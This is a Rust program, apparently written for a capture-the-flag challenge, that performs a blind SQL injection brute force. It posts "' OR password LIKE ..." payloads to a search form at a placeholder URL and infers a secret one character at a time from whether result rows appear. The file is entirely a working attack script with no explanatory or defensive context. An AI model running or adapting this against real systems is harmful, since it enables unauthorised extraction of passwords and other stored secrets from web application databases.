use reqwest::blocking::Client;
use std::error::Error;
use std::time::Duration;

const URL: &str = "set_your_url_here";
const FLAG_PREFIX: &str = "flag{";
const FLAG_SUFFIX: &str = "}";
const CHARSET: &[u8] = b"{}abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_";

fn main() -> Result<(), Box<dyn Error>> {
    let client = Client::builder()
        .timeout(Duration::from_secs(5))
        .build()?;

    let mut current_flag = String::from(FLAG_PREFIX);
    println!("Starting SQL injection brute-force attack...");

    while !current_flag.ends_with(FLAG_SUFFIX) {
        match find_next_char(&client, &current_flag) {
            Some(c) => {
                current_flag.push(c);
                println!("[+] Found next character: {}", c);

                if c == '}' {
                    println!("[+] Found flag: {}", current_flag);
                    return Ok(());
                }
            }
            None => {
                println!("[-] No matching character found. Aborting.");
                break;
            }
        }
    }

    println!("[+] Found flag: {}", current_flag);
    Ok(())
}

fn find_next_char(client: &Client, current_flag: &str) -> Option<char> {
    for &c in CHARSET {
        let test_flag = format!("{}{}%", current_flag, c as char);
        let payload = format!("' OR password LIKE '{}'; -- ", test_flag);

        println!("[*] Testing: {}", test_flag);

        let res = client.post(URL)
            .header("Content-Type", "application/x-www-form-urlencoded")
            .body(format!("search={}", payload))
            .send();

        if let Ok(response) = res {
            let body = response.text().unwrap_or_default();

            if body.contains("<td>") {
                return Some(c as char);
            }
        } else {
            eprintln!("Error sending request: {}", res.unwrap_err());
            return None;
        }
    }

    None
}
